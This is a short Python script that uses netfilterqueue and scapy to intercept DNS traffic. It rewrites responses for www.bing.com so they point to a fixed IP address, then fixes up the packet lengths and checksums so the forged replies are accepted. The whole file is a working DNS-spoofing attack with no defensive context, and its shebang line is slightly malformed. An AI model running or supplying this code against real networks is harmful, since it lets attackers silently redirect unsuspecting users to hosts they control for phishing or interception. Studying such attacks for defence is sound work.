#! /usr/bin/env/ python

import netfilterqueue as nfq
import scapy.all as scapy

def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "www.bing.com" in qname:
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata="202.165.107.49")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum
			del scapy_packet[scapy.UDP].len
			
			packet.set_payload(str(scapy_packet))
	packet.accept()
	
queue = nfq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
